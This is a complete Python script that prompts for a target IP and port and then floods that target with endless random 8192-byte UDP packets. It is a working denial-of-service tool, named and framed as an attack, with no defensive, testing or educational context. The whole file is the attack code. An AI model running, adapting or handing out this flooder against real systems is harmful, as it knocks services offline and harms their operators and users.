import sys
import socket
import time
import random
import asyncio

async def attack(server, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
    s.settimeout(4)
    packets = 0
    try:
        while True:
            s.sendto(bytes(random._urandom(8192)), (server, port))
            packets += 1
            print(f"Sent {packets} packets")
    except:
        print("Failed to attack")

async def main():
    server = input("Enter server IP: ")
    port = int(input("Enter port: "))
    await attack(server, port)

asyncio.run(main())
